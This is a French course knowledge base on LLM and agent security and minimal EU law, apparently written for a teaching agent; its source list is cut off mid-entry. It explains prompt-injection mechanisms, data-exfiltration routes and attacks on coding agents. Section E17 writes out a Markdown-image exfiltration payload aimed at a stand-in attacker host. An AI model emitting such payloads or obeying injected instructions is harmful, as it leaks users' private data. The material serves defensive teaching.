# Thème E : sécurité des applications et agents LLM, cadre légal minimal

Base de connaissances de l'agent « prof » (FYC ESGI, parcours Laravel).
Rédigé et vérifié le 24/11/2026. Toutes les sources listées en section 4 ont
été ouvertes et lues à cette date.
Séquences concernées : S2.1 (point sécurité du tool calling), S2.3 (limites du
RAG), S4.2 (risques et sécurité), S4.4 (TP tests d'injection), S5 (prod, fiche
d'architecture finale).

---

## 1. Savoir de référence

### 1.1 Référentiels OWASP : ce qui a changé en 2026

**E1. Il existe une édition 2026 du Top 10 OWASP pour les applications LLM, et
le cours cite encore l'édition 2025.** La ressource « OWASP GenAI LLM Top 10
2026 » est datée du 3 août 2026 sur genai.owasp.org et a été annoncée
officiellement le 2 septembre 2026 [OWASP-LLM26] [OWASP-PR26]. L'ordre 2026 est :
LLM01 Prompt Injection, LLM02 Sensitive Information Disclosure, LLM03 Excessive
Agency, LLM04 Supply Chain, LLM05 Data and Model Poisoning, LLM06 Unbounded
Consumption, LLM07 Misinformation, LLM08 Hidden Context Exposure, LLM09 Vector
and Embedding Weaknesses, LLM10 Improper Output Handling [OWASP-LLM26]. La
bibliographie du cours (édition 2025, consultée le 8/09/2026) et la « grille des
dix risques » de S4.2 doivent être mises à jour.

**E2. L'injection de prompt reste n°1, mais la formule « en première place
depuis deux éditions » (scénarisation S4.2) est désormais imprécise.** Elle est
LLM01 en 2025 et en 2026 (et la catégorie existait déjà en tête de la première
liste de 2023, non revérifiée en détail ici) [OWASP-LLM26] [CSA-26]. Mieux
vaut écrire « en première place dans toutes les éditions, y compris 2026 ».
Nuance méthodologique utile au prof : pour 2026, OWASP a pondéré le vote
communautaire (75 %) avec un corpus de 7 714 incidents publics (25 %) ; sur les
seuls incidents, l'injection sortait du top 10, ce qu'OWASP interprète comme un
« effet de défense » (risque très investi donc sous-représenté) [CSA-26]. Le
classement est un guide de modélisation de menaces, pas une probabilité.

**E3. Les grands mouvements 2025 vers 2026 parlent directement à un cours sur
les agents.** Excessive Agency passe de 6e à 3e, Unbounded Consumption de 10e à
6e (coût des modèles de raisonnement et des boucles d'agent, « denial of
wallet »), Improper Output Handling de 5e à 10e, et System Prompt Leakage
devient Hidden Context Exposure (LLM08), élargi aux schémas d'outils, règles de
workflow et logique de politique [CSA-26]. Pour le fil rouge : la boucle
d'agent écrite en S2 doit avoir un budget de tokens et d'itérations (LLM06), et
les descriptions d'outils doivent être considérées comme potentiellement
extractibles (LLM08).

**E4. Le Top 10 OWASP pour les applications agentiques (édition « 2026 ») a été
publié le 9-10 décembre 2025.** Ses dix entrées : ASI01 Agent Goal Hijack,
ASI02 Tool Misuse and Exploitation, ASI03 Identity and Privilege Abuse, ASI04
Agentic Supply Chain Vulnerabilities, ASI05 Unexpected Code Execution (RCE),
ASI06 Memory and Context Poisoning, ASI07 Insecure Inter-Agent Communication,
ASI08 Cascading Failures, ASI09 Human-Agent Trust Exploitation, ASI10 Rogue
Agents [OWASP-ASI] [OWASP-ASI-PR]. ASI01 se distingue de LLM01 : il couvre le
détournement des objectifs et du plan multi-étapes, pas seulement d'une réponse
[OWASP-ASI01]. OWASP recommande explicitement de lire les deux listes ensemble
dès que le modèle devient un « acteur » (outils, mémoire) [CSA-26] : c'est le
cas du fil rouge.

### 1.2 Mécanisme de l'injection de prompt

**E5. Cause racine : instructions et données passent dans le même flux de
tokens, sans frontière de confiance appliquée.** OWASP LLM01:2026 l'écrit
explicitement : il n'existe pas d'équivalent propre aux requêtes paramétrées du
SQL [OWASP-LLM01-26]. Le terme « prompt injection » a été forgé par Simon
Willison en 2022 par analogie avec l'injection SQL (concaténation de chaînes de
confiance et non fiables) [Willison-Trifecta]. C'est l'énoncé exact du « point
d'attention » de S4.2 : il est juste et à garder.

**E6. Injection directe et indirecte : définitions à jour.** Directe :
l'utilisateur (ou quelqu'un utilisant son accès) fournit l'entrée ; elle peut
être intentionnelle ou non intentionnelle (copier-coller d'un texte contenant
des instructions) [OWASP-LLM01-26]. Indirecte : l'instruction arrive par un
contenu externe que l'utilisateur n'a ni écrit ni vu : page web, document,
courriel, passage RAG, sortie d'outil, sortie de serveur MCP, ligne de base de
données [OWASP-LLM01-26]. L'injection indirecte a été démontrée en 2023 sur
Bing Chat (GPT-4) par Greshake et al., qui montrent que traiter un prompt
récupéré équivaut à de « l'exécution de code arbitraire » [Greshake23]. Le
papier « Design Patterns » de 2025 ne distingue d'ailleurs plus directe et
indirecte et parle simplement d'injection [BeurerKellner25].

**E7. Injection n'est pas jailbreak.** Le jailbreak vise à faire violer au
modèle ses règles de sécurité (contenu interdit) ; l'injection vise
l'application qui mélange contenus de confiance et non fiables [Willison-
Trifecta]. OWASP 2026 classe le jailbreak comme sous-ensemble de l'injection
directe [OWASP-LLM01-26]. Pédagogiquement, la confusion fait croire aux
développeurs que le problème concerne seulement l'éditeur du modèle, alors
qu'il concerne leur propre application [Willison-Trifecta].

**E8. Surfaces 2026 à connaître : multimodal, Unicode invisible, mémoire.**
OWASP 2026 décrit trois axes (surface de livraison, propagation, encodage) et
ajoute : caractères Unicode invisibles (blocs « tag » U+E0000 à E007F,
sélecteurs de variante, espaces de largeur nulle) pour cacher des instructions
ou exfiltrer, injections dans images et audio, payloads encodés (Base64,
langues peu dotées), et empoisonnement persistant de la mémoire ou du corpus
RAG qui contamine toutes les sessions suivantes [OWASP-LLM01-26]. Mesure
concrète et testable en PHP : supprimer ces plages de caractères à l'ingestion
et au rendu (recommandation n°5 de LLM01:2026).

### 1.3 Modèles mentaux de risque : trifecta et règle de deux

**E9. La « lethal trifecta » (Willison, 16 juin 2025).** Un agent qui combine
(1) accès à des données privées, (2) exposition à du contenu non fiable,
(3) capacité de communiquer vers l'extérieur peut être amené à exfiltrer ces
données [Willison-Trifecta]. Les cas réels cités incluent Microsoft 365 Copilot
(EchoLeak), le serveur MCP officiel de GitHub, GitLab Duo, ChatGPT, Bard,
Slack, etc. ; la plupart ont été corrigés en fermant le canal d'exfiltration
[Willison-Trifecta]. La seule protection sûre pour l'utilisateur qui combine des
outils est d'éviter la combinaison des trois [Willison-Trifecta]. OWASP
LLM01:2026 reprend la trifecta comme contrôle avant déploiement : retirer une
seule « jambe » suffit à supprimer les conditions d'exploitation à fort impact
[OWASP-LLM01-26].

**E10. La « Agents Rule of Two » de Meta (31 octobre 2025) généralise la
trifecta.** Dans une même session, un agent ne doit pas cumuler plus de deux
propriétés parmi : [A] traiter des entrées non fiables, [B] accéder à des
systèmes sensibles ou données privées, [C] changer d'état ou communiquer vers
l'extérieur ; s'il lui faut les trois, il ne doit pas agir en autonomie et
requiert au minimum une validation humaine [Meta-Rule2]. Willison note que
l'ajout du « changement d'état » couvre des risques que la trifecta (centrée
exfiltration) ne couvre pas [Willison-Rule2]. OWASP 2026 en fait un plancher
(mitigation n°8 de LLM01) [OWASP-LLM01-26]. Meta précise que la règle ne suffit
pas seule et ne dispense pas de défense en profondeur [Meta-Rule2].

### 1.4 Défenses : ce qui marche, ce qui ne suffit pas

**E11. Aucune défense « détecter et filtrer » n'est fiable seule : le consensus
2025-2026 est architectural.** OWASP LLM01:2026 : « no reliable prevention
mechanism exists today », la défense est « architecturale plutôt
qu'interceptive » et doit supposer que la frontière d'instruction sera un jour
contournée [OWASP-LLM01-26]. « The Attacker Moves Second » (octobre 2025)
contourne 12 défenses publiées avec plus de 90 % de succès pour la plupart,
alors qu'elles rapportaient un taux proche de zéro [Nasr25]. Meta, OpenAI et
Anthropic disent tous que le problème n'est pas résolu ; Anthropic indique
qu'environ 1 % de taux de succès d'attaque en navigation reste un « risque
significatif » [Meta-Rule2] [OpenAI-PI] [Anthropic-PI]. Conséquence pour S4.2 :
le message « aucune mesure seule ne suffit, c'est le cumul qui compte » est
juste, mais il faut ajouter que les mesures n'ont pas la même valeur : celles
qui bornent l'impact tiennent face à un attaquant adaptatif, celles qui
détectent se dégradent [OWASP-LLM01-26].

**E12. Les dix mesures de LLM01:2026, à hiérarchiser pour le cours.** OWASP
liste notamment : contraindre le rôle dans le prompt système (contrôle partiel),
schéma de sortie strict validé par du code de confiance (pas par un second
appel LLM), filtres par modalité, credentials et capacités de changement d'état
tenus par le code applicatif avec moindre privilège par opération et moteur de
politique déterministe, suppression des caractères invisibles, canal séparé et
étiqueté pour le contenu externe, confirmation humaine montrant l'action exacte,
règle de deux, écritures en mémoire traitées comme privilégiées, épinglage et
audit des serveurs MCP [OWASP-LLM01-26]. Les mesures 2 et 4 sont exactement ce
que l'apprenant code sans SDK (validation du JSON d'appel d'outil, autorisation
côté Laravel via Policies/Gates) : c'est un argument fort pour l'approche TP du
cours.

**E13. Spotlighting et séparation du contenu non fiable : utile, mais pas une
garantie.** Microsoft Research (mars 2024) propose le « spotlighting »
(délimitation, marquage de chaque mot, encodage type base64 du contenu externe)
et mesure une baisse du taux de succès de plus de 50 % à moins de 2 % sur des
modèles GPT [Hines24]. Microsoft le combine en production avec des
classifieurs (Prompt Shields), le blocage des canaux d'exfiltration et le
consentement humain [MSRC25]. OWASP 2026 rappelle que ces marquages ne valent
qu'en test non adaptatif : un attaquant qui connaît le schéma peut l'imiter
[OWASP-LLM01-26]. La mesure « séparer le contenu non fiable » de S4.2 est donc à
présenter comme réduction de probabilité, pas comme barrière.

**E14. Les six design patterns de Beurer-Kellner et al. (juin 2025).** Principe
commun : une fois qu'un agent a ingéré une entrée non fiable, il doit être
impossible que cette entrée déclenche une action conséquente [BeurerKellner25].
Patterns : Action-Selector (l'LLM choisit parmi des actions prédéfinies, sans
retour des résultats vers l'agent), Plan-Then-Execute (plan fixé avant de lire
les données non fiables), LLM Map-Reduce (sous-agents isolés par document,
agrégation contrainte), Dual LLM (LLM privilégié avec outils, LLM en
quarantaine sans outils, proposé par Willison en 2023), Code-Then-Execute
(l'agent écrit un programme, cf. CaMeL), Context-Minimization (retirer du
contexte ce qui n'est plus nécessaire) [BeurerKellner25]. Microsoft le présente comme issu d'un consortium
d'entreprises d'IA et d'instituts de recherche auquel il a participé [MSRC25]. Il échange de l'utilité contre de la sécurité : c'est une décision
d'architecture à justifier dans la fiche finale de S5.3.

**E15. CaMeL (Google DeepMind et al., mars 2025, révisé juin 2025).** CaMeL
extrait le flux de contrôle et le flux de données de la requête de confiance,
de sorte que les données non fiables ne peuvent jamais modifier le flux du
programme ; chaque valeur porte des « capabilities » (métadonnées de
provenance) vérifiées par des politiques au moment des appels d'outils, via un
interpréteur Python dédié [Debenedetti25]. Résultat sur AgentDojo : 77 % des
tâches résolues avec sécurité prouvable contre 84 % sans défense
[Debenedetti25]. Point clé pour le cours : la sécurité ne repose pas sur le
modèle, mais sur des concepts classiques (intégrité du flux de contrôle,
contrôle d'accès, contrôle de flux d'information) [Debenedetti25]. À présenter
comme horizon de recherche, pas comme pattern à implémenter en 15 h.

**E16. Moindre privilège et human-in-the-loop : les deux mesures « porteuses ».**
OWASP 2026 qualifie de « load-bearing » le moindre privilège et la règle de
deux pour les agents [OWASP-LLM01-26] ; ASI01 demande moindre privilège des
outils et approbation humaine des actions à fort impact [OWASP-ASI01]. Limites
documentées : la fatigue d'approbation, et un affichage qui peut différer de
l'action exécutée (Unicode invisible), d'où l'exigence de montrer l'action
exacte, pas un résumé [OWASP-LLM01-26]. Côté outillage, le Laravel AI SDK a
ajouté une API d'approbation humaine des outils (contrat `Approvable`, trait
`InteractsWithApprovals`) dans la v0.10.0 du 21 juillet 2026, présente dans la
v1.0 du 23 septembre 2026 [LaravelNews-HITL] [Laravel-v1]. Le comparatif S4.3 et
la bibliographie (qui indiquent « version 0.x ») sont à actualiser.

### 1.5 Fuites, exfiltration, RAG, MCP

**E17. Exfiltration par image Markdown : le canal classique à bloquer.** Si
l'interface rend du Markdown, une injection peut faire produire
`![](https://attaquant/x.png?d=DONNEES)` : le navigateur charge l'image et
envoie les données sans clic. Le vecteur a été montré sur ChatGPT web en avril
2023 (mitigé par OpenAI en décembre 2023) [Willison-MdImg], puis sur de nombreux
produits [Willison-Trifecta]. OWASP 2026 liste l'exfiltration par URL d'image et
par caractères invisibles parmi les conséquences de LLM01 [OWASP-LLM01-26].
Parade pour le fil rouge Laravel : ne pas rendre les images externes, liste
blanche de domaines, CSP `img-src` restrictive, échappement Blade de la sortie
(LLM10 Improper Output Handling).

**E18. Fuite de données via le contexte : c'est d'abord un problème
d'autorisation en amont.** LLM02:2026 insiste : si le RAG récupère un document
que l'utilisateur n'a pas le droit de voir, le modèle « fonctionne comme
prévu », la faute est commise avant l'entrée dans le contexte [CSA-26]. La
fuite peut aussi passer par les journaux d'appels d'outils, les traces et les
embeddings [CSA-26]. Conséquence pour S2.3 : filtrer la recherche pgvector par
les droits de l'utilisateur courant (colonne de propriétaire ou de tenant dans
la requête SQL), pas après la génération. Conséquence pour S3/S5 : ne pas
journaliser les prompts complets contenant des données personnelles sans
nécessité.

**E19. Empoisonnement de RAG : quelques documents suffisent.** PoisonedRAG
(USENIX Security 2025) atteint 90 % de succès en injectant 5 textes malveillants
par question cible dans une base de millions de textes ; les défenses évaluées
sont insuffisantes [Zou25]. OWASP 2026 distingue l'empoisonnement durable
(LLM05) de l'instruction rencontrée à l'inférence (LLM01) et des attaques sur la
géométrie des embeddings (LLM09) [CSA-26]. Pour S2.3 : la provenance et le
contrôle d'écriture sur le corpus indexé font partie du pipeline de données.

**E20. Sécurité MCP : la spécification a ses propres « Security Best
Practices », versionnées.** Versions consultées : 2025-06-18, 2025-11-25 et
2026-07-28 (la plus récente en ligne) [MCP-SBP]. Points à retenir : problème du
« confused deputy » des serveurs proxy (consentement par client obligatoire),
interdiction du « token passthrough » (un serveur MCP NE DOIT PAS accepter un
jeton non émis pour lui), SSRF, minimisation des scopes (pas de `*` ou
`full-access`), isolation et moindre privilège des processus stdio [MCP-SBP].
Côté injection : les descriptions d'outils et sorties de serveurs MCP sont du
contenu non fiable (cas GitHub MCP, 2025) [Willison-Talk25] ; OWASP demande
d'épingler, signer et auditer les serveurs MCP [OWASP-LLM01-26].

**E21. Les agents de code et « computer use » sont la surface la plus exploitée
en 2025.** Johann Rehberger (Embrace The Red) a divulgué pendant le « Month of
AI Bugs » (août 2025) plus de vingt vulnérabilités dans les principaux
assistants de code (Claude Code, GitHub Copilot, Jules, Devin, Amazon Q, Kiro),
présentées au 39C3 (décembre 2025) : exfiltration zéro-clic, exécution de code
à distance, persistance [Rehberger-39C3]. Défauts systémiques relevés :
confiance excessive dans le comportement du LLM pour les décisions de
confiance, bac à sable insuffisant, contrôles humains faibles
[Rehberger-39C3]. Utile en S4.2 comme exemples récents et en ouverture de S5.3.

### 1.6 Cadre légal minimal (UE, France)

**E22. AI Act : le calendrier a été modifié par le « Digital Omnibus on AI »
(règlement (UE) 2026/1744, JO du 24 juillet 2026, en vigueur le 27 juillet
2026).** Calendrier actuel : 1er août 2024 entrée en vigueur ; 2 février 2025
définitions, maîtrise de l'IA (AI literacy, art. 4) et interdictions ; 2 août
2025 règles des modèles d'IA à usage général (GPAI) et gouvernance ; 2 août 2026
majorité des règles dont la transparence (art. 50) et début de l'application ;
2 décembre 2026 nouvelles interdictions (deepfakes sexuels non consentis,
pédocriminalité) et fin de la transition art. 50(2) pour les systèmes mis sur
le marché avant le 2 août 2026 ; 2 décembre 2027 haut risque Annexe III ;
2 août 2028 haut risque Annexe I [AIAct-Timeline] [EP-Omnibus] [Cuatrecasas26].
Tout support qui annonce « haut risque au 2 août 2026 » est obsolète.

**E23. Obligation de transparence concrète pour le fil rouge (art. 50(1)).**
Le fournisseur d'un système qui interagit directement avec des personnes
(chatbot, agent) doit faire en sorte qu'elles sachent qu'elles parlent à une
IA, dès la première interaction, de façon claire, sauf si c'est évident pour
une personne raisonnablement informée (exception d'interprétation stricte)
[EC-Art50]. L'art. 50(2) impose un marquage lisible par machine des contenus
générés (le code source et les courtes séquences en sont exclus selon les
lignes directrices) [EC-Art50]. Amendes jusqu'à 15 M€ ou 3 % du CA mondial
[EC-Art50]. Applicable depuis le 2 août 2026 : à mentionner dans S4.2 ou S5.3
(un bandeau « Vous échangez avec un assistant IA » dans l'interface Laravel).
Attention : la FAQ de la Commission cite par erreur « 50(2) » pour les
chatbots dans un paragraphe, l'obligation chatbot est l'art. 50(1).

**E24. RGPD : la CNIL donne le cadre pratique.** Pour le déploiement d'une IA
générative, la CNIL recommande de partir d'un besoin concret, de définir usages
autorisés et interdits (par exemple ne pas fournir de données personnelles au
système, ne pas lui confier de décision), de ne pas occulter les limites
(hallucinations) et de privilégier des systèmes locaux, sécurisés et
spécialisés [CNIL-Deploy]. Ses 13 fiches pratiques sur le développement
(finalisées le 22 juillet 2025) couvrent base légale, AIPD, minimisation,
information, droits, sécurité (fiche 12) et statut des modèles au regard du
RGPD (fiche 13), avec une liste de vérification [CNIL-Fiches]. Pour le fil
rouge : envoyer des données personnelles à un fournisseur d'API externe implique
qualification du fournisseur (sous-traitant), minimisation, et question des
transferts hors UE ; l'option Ollama locale (S1.3) est un argument RGPD.

**E25. Référentiels institutionnels : ANSSI et NIST.** L'ANSSI (29 avril 2024)
publie des « Recommandations de sécurité pour un système d'IA générative » :
cloisonnement des phases, passerelle Internet sécurisée, filtrage des entrées et
sorties en défense en profondeur, prise en compte explicite de l'injection
indirecte (contenu de courriel ou de page web) [ANSSI24]. Le guide exclut
explicitement la protection des données personnelles (renvoi vers la CNIL)
[ANSSI24]. Le NIST AI 600-1 (26 juillet 2024) est le profil IA générative du
AI RMF, d'usage volontaire, issu de l'Executive Order 14110 [NIST600-1] ; OWASP
2026 s'appuie aussi sur le NIST AI 100-2 E2025 (taxonomie des attaques, non
ouvert ici) [OWASP-LLM01-26]. Pour un public français, ANSSI et CNIL priment ;
le NIST sert de référence de vocabulaire.

---

## 2. Ordre d'enseignement recommandé

### 2.1 Proposition pour ce cours

1. **S2.1, dès le tool calling : poser le principe « l'IA propose, le code
   décide et autorise ».** Introduire ici, en 5 minutes, moindre privilège des
   outils et validation du JSON d'appel par du code de confiance (E12, E16).
   Raison : c'est le moment où l'apprenant écrit le contrat d'outil ; si la
   sécurité arrive en S4.2 seulement, les outils auront déjà trop de droits.
   Annoncer aussi la catégorie Excessive Agency (LLM03:2026, E3).
2. **S2.3, en fin de RAG : limites de sécurité du pipeline.** Filtrage des
   documents par droits de l'utilisateur avant la recherche (E18), provenance
   et contrôle d'écriture du corpus (E19), et annonce : « tout document indexé
   est du contenu non fiable », qui prépare l'injection indirecte de S4.2.
3. **S3 (boucle d'agent, retry) : budget de tokens et d'itérations** (LLM06
   Unbounded Consumption, E3). Ce n'est pas que de la résilience, c'est un
   risque OWASP n°6 en 2026.
4. **S4.2, dans cet ordre :**
   a. Cause racine (même canal, E5), puis injection directe vs indirecte (E6)
      et distinction avec le jailbreak (E7). La cause doit précéder la liste
      OWASP pour que les dix risques ne soient pas une liste à apprendre par
      cœur.
   b. Démonstration de l'injection indirecte sur l'index S2 (déjà prévue), puis
      exfiltration par image Markdown (E17) : c'est ce qui rend tangible la
      trifecta.
   c. Modèle mental : trifecta puis règle de deux (E9, E10). La trifecta est
      plus simple, la règle de deux ajoute le changement d'état.
   d. Grille OWASP LLM 2026 + mention du Top 10 agentique (E1 à E4), utilisée
      pour situer l'agent du fil rouge.
   e. Défenses hiérarchisées : d'abord celles qui bornent l'impact (moindre
      privilège, autorisation hors modèle, HITL, blocage d'exfiltration,
      patterns), ensuite celles qui réduisent la probabilité (spotlighting,
      filtres, prompt système) (E11 à E16). CaMeL en ouverture.
5. **S4.4 : tests d'injection** directe, indirecte, et un test d'exfiltration
   Markdown ; tester les contrôles déterministes (l'outil refuse, la sortie est
   assainie) plutôt que « le modèle refuse », qui est non déterministe.
6. **S5 : cadre légal minimal et opérationnel.** Transparence art. 50 et
   calendrier AI Act (E22, E23), RGPD (E24), journaux sans données personnelles
   inutiles (E18), audit des serveurs MCP et des dépendances (E20, LLM04).
   Dans la fiche d'architecture S5.3 : justifier la configuration selon la
   règle de deux.

### 2.2 Comparaison avec des cours et guides de référence

- **Microsoft « Generative AI for Beginners » (21 leçons, GitHub)** : la leçon
  13 « Securing Your Generative AI Applications » vient après la leçon 11
  (function calling) mais avant la leçon 15 (RAG) et 17 (agents)
  [MS-GenAI4B]. Le contenu de la leçon 13 est centré sur l'entraînement
  (empoisonnement, label flipping), peu sur l'injection indirecte. Le cours FYC
  fait mieux en plaçant la sécurité après RAG et agent, mais il gagnerait à
  semer des rappels plus tôt (S2.1, S2.3) au lieu d'un bloc unique.
- **DeepLearning.AI « Red Teaming LLM Applications » (avec Giskard)** : approche
  « attaquer d'abord » sur des chatbots pour comprendre les échecs, puis
  corriger [DLAI-RedTeam]. Cohérent avec S4.2 (l'apprenant écrit un texte piégé)
  et S4.4 (tests qui doivent d'abord échouer).
- **OWASP LLM01:2026 et papier Design Patterns** : tous deux posent d'abord la
  cause structurelle (même flux de tokens), puis le modèle de risque (trifecta,
  règle de deux), puis les contrôles architecturaux, et en dernier les filtres
  [OWASP-LLM01-26] [BeurerKellner25]. C'est l'ordre retenu en 2.1 (4a à 4e).

---

## 3. Erreurs et idées reçues fréquentes

- **« Il suffit d'écrire dans le prompt système de ne pas obéir aux
  instructions des documents. »** Faux : contrôle partiel, contournable par un
  attaquant qui infère le prompt [OWASP-LLM01-26] [Willison-Trifecta].
- **« Un classifieur ou un second LLM-juge bloque les injections. »** Réduit la
  probabilité, mais 12 défenses publiées ont été contournées à plus de 90 % par
  des attaques adaptatives [Nasr25]. OWASP demande une validation de sortie par
  du code de confiance, pas par un second appel LLM [OWASP-LLM01-26].
- **« Le spotlighting / les délimiteurs règlent l'injection indirecte. »** Gain
  mesuré en non adaptatif seulement [Hines24] [OWASP-LLM01-26].
- **« Prompt injection = jailbreak, c'est le problème du fournisseur du
  modèle. »** Non, c'est une faille de l'application [Willison-Trifecta].
- **« Mon agent ne fait que lire, il n'y a pas de risque. »** Lecture de données
  privées + contenu non fiable + un rendu Markdown d'image = canal
  d'exfiltration sans aucun outil d'écriture [Willison-MdImg] [Willison-
  Trifecta].
- **« Le RAG est sûr car ce sont nos propres documents. »** Tout contenu
  indexé venant d'utilisateurs, de tickets, de PDF reçus est non fiable ; 5
  textes suffisent à empoisonner une réponse cible [Zou25].
- **« La fuite de données vient du modèle. »** Souvent, elle vient d'une
  récupération sans contrôle d'accès en amont [CSA-26].
- **« Un humain valide, donc c'est sûr. »** Fatigue d'approbation, affichage
  différent de l'action réelle [OWASP-LLM01-26] ; Meta cite l'utilisateur qui
  confirme aveuglément [Meta-Rule2].
- **« OWASP 2025 est l'édition en vigueur. »** Obsolète depuis août-septembre
  2026 [OWASP-LLM26].
- **« Les obligations haut risque de l'AI Act s'appliquent au 2 août 2026. »**
  Reportées au 2 décembre 2027 (Annexe III) et 2 août 2028 (Annexe I) par le
  règlement 2026/1744 [EP-Omnibus] [AIAct-Timeline].
- **« L'AI Act ne concerne pas un petit chatbot. »** L'art. 50(1) (informer
  qu'on parle à une IA) s'applique depuis le 2 août 2026 sans condition de haut
  risque ; l'art. 4 (maîtrise de l'IA) depuis février 2025 [EC-Art50]
  [AIAct-Timeline].
- **« MCP est sécurisé par conception. »** La spécification documente elle-même
  confused deputy, token passthrough, SSRF, scopes trop larges [MCP-SBP].
- **« Un test d'injection qui passe prouve que l'agent est sûr. »** Le
  comportement est non déterministe et les attaques infinies ; tester surtout
  les garde-fous déterministes (E12) et répéter les cas.

---

## 4. Sources

1. OWASP GenAI Security Project (2026), *OWASP GenAI LLM Top 10 2026* (page
   hub « 2026 Top 10 Critical Security Risks for LLM Applications »),
   genai.owasp.org.
   https://genai.owasp.org/resource/owasp-genai-llm-top-10-2026/ et
   https://genai.owasp.org/top-10-for-llm-applications-2026/
   Type : référentiel. Version 2026 (ressource datée du 3 août 2026). Consulté
   le 24/11/2026. [S4.2, S2.1, S2.3, S3, S5] Clé : [OWASP-LLM26]
   Apport : liste et ordre officiels 2026. Remplace l'édition 2025 citée dans
   la bibliographie. Note : le bouton « Download Guide » du hub pointe encore
   vers la ressource 2025, utiliser le lien « resource » ci-dessus.

2. OWASP GenAI Security Project (2026), *LLM01:2026 Prompt Injection*,
   genai.owasp.org.
   https://genai.owasp.org/llm2026/llm012026-prompt-injection/
   Type : référentiel (fiche). Version 2026. Consulté le 24/11/2026.
   [S4.2, S4.4] Clé : [OWASP-LLM01-26]
   Apport : définition à jour, types direct/indirect, 8 exemples, 10 mesures
   hiérarchisées, reprise de la trifecta et de la règle de deux.

3. OWASP GenAI Security Project (2026), *OWASP GenAI Security Project Unveils
   2026 Top 10 for LLM Applications...*, blog genai.owasp.org.
   https://genai.owasp.org/2026/09/01/owasp-genai-security-project-unveils-2026-top-10-for-llm-applications-new-agent-control-standard-and-sponsors-as-community-tops-30000-members/
   Type : communiqué. 1-2 septembre 2026. Consulté le 24/11/2026. [S4.2]
   Clé : [OWASP-PR26]
   Apport : date officielle, méthode fondée sur des incidents réels, annonce de
   l'Agent Control Standard.

4. Kaplan D. (2026), *The OWASP Top 10 for LLM Applications (2026): What
   Changed and Why It Matters*, Cloud Security Alliance (repris d'Aembit).
   https://cloudsecurityalliance.org/blog/2026/10/21/the-owasp-top-10-for-llm-applications-2026-what-changed-and-why-it-matters
   Type : billet d'analyse (source secondaire). 21 octobre 2026. Consulté le
   24/11/2026. [S4.2] Clé : [CSA-26]
   Apport : tableau des rangs 2025 vs 2026, méthode 75 % vote / 25 % incidents
   (7 714 incidents). Secondaire : recouper avec la source 1.

5. OWASP GenAI Security Project (2025), *OWASP Top 10 for Agentic Applications
   2026*, genai.owasp.org (PDF version « 2026 », décembre 2025).
   https://genai.owasp.org/top-10-for-agentic-applications-2026/ et fiche
   https://genai.owasp.org/agentic-applications-2026/asi01-agent-goal-hijack/
   Type : référentiel. Publié le 9-10 décembre 2025. Consulté le 24/11/2026.
   [S4.2, S5.3] Clés : [OWASP-ASI] [OWASP-ASI01]
   Apport : 10 risques propres aux agents (ASI01 à ASI10), mitigations : moindre
   privilège des outils, approbation humaine, prompts système verrouillés.

6. OWASP GenAI Security Project (2025), *OWASP GenAI Security Project Releases
   Top 10 Risks and Mitigations for Agentic AI Security*, blog genai.owasp.org.
   https://genai.owasp.org/2025/12/09/owasp-genai-security-project-releases-top-10-risks-and-mitigations-for-agentic-ai-security/
   Type : communiqué. 9 décembre 2025. Consulté le 24/11/2026. [S4.2]
   Clé : [OWASP-ASI-PR]
   Apport : date de publication et gouvernance (plus de 100 contributeurs,
   revue incluant NIST et Commission européenne).

7. Willison S. (2025), *The lethal trifecta for AI agents: private data,
   untrusted content, and external communication*, simonwillison.net.
   https://simonwillison.net/2025/jun/16/the-lethal-trifecta/
   Type : billet de blog (praticien de référence). 16 juin 2025. Consulté le
   24/11/2026. [S4.2, S2.1] Clé : [Willison-Trifecta]
   Apport : modèle mental central, liste d'incidents réels 2023-2025,
   distinction injection / jailbreak, origine du terme.

8. Willison S. (2025), *My Lethal Trifecta talk at the Bay Area AI Security
   Meetup*, simonwillison.net (présentation annotée).
   https://simonwillison.net/2025/Aug/9/bay-area-ai/
   Type : conférence (non filmée, diapositives annotées). 6 août 2025 (billet du
   9 août). Consulté le 24/11/2026. [S4.2] Clé : [Willison-Talk25]
   Apport : cas du serveur MCP GitHub (les trois jambes de la trifecta),
   exemples visuels réutilisables en cours.

9. Meta AI (2025), *Agents Rule of Two: A Practical Approach to AI Agent
   Security*, blog ai.meta.com.
   https://ai.meta.com/blog/practical-ai-agent-security/
   Type : billet d'ingénierie éditeur. 31 octobre 2025 (date donnée par
   Willison, la page ne l'affiche pas dans l'extrait lu). Consulté le
   24/11/2026. [S4.2, S5.3] Clé : [Meta-Rule2]
   Apport : règle [A][B][C], configurations AB/AC/BC, limites de la règle.

10. Willison S. (2025), *New prompt injection papers: Agents Rule of Two and
    The Attacker Moves Second*, simonwillison.net.
    https://simonwillison.net/2025/Nov/2/new-prompt-injection-papers/
    Type : billet d'analyse. 2 novembre 2025. Consulté le 24/11/2026. [S4.2]
    Clé : [Willison-Rule2]
    Apport : lien trifecta / règle de deux, ajout du « changement d'état ».

11. Nasr M., Carlini N., Sitawarin C., Schulhoff S.V., Hayes J. et al. (2025), *The Attacker Moves Second: Stronger
    Adaptive Attacks Bypass Defenses Against LLM Jailbreaks and Prompt
    Injections*, arXiv:2510.09023.
    https://arxiv.org/abs/2510.09023
    Type : article de recherche (préprint). 10 octobre 2025, v1. Consulté le
    24/11/2026. [S4.2, S4.4] Clé : [Nasr25]
    Apport : 12 défenses contournées à plus de 90 % ; argument pour des
    défenses architecturales et des tests adaptatifs (14 auteurs, dont
    Shumailov, Terzis et Tramèr).

12. Beurer-Kellner L., Buesser B., Creţu A.-M., Debenedetti E., Dobos D. et
    al. (2025), *Design Patterns for Securing LLM Agents against Prompt
    Injections*, arXiv:2506.08837.
    https://arxiv.org/abs/2506.08837
    Type : article de recherche. 10 juin 2025, v3 du 27 juin 2025. Consulté le
    24/11/2026. [S4.2, S5.3] Clé : [BeurerKellner25]
    Apport : six patterns avec compromis utilité/sécurité et dix études de cas.

13. Debenedetti E., Shumailov I., Fan T., Hayes J., Carlini N., Fabian D.,
    Kern C., Shi C., Terzis A. et Tramèr F. (2025), *Defeating Prompt
    Injections by Design* (CaMeL), arXiv:2503.18813.
    https://arxiv.org/abs/2503.18813
    Type : article de recherche (Google, Google DeepMind, ETH Zurich). 24 mars
    2025, v2 du 24 juin 2025 ; une version IEEE est indexée (non lue). Consulté
    le 24/11/2026. [S4.2] Clé : [Debenedetti25]
    Apport : séparation flux de contrôle / flux de données, capabilities,
    77 % vs 84 % sur AgentDojo.

14. Greshake K., Abdelnabi S., Mishra S., Endres C., Holz T. et Fritz M.
    (2023), *Not what you've signed up for: Compromising Real-World
    LLM-Integrated Applications with Indirect Prompt Injection*,
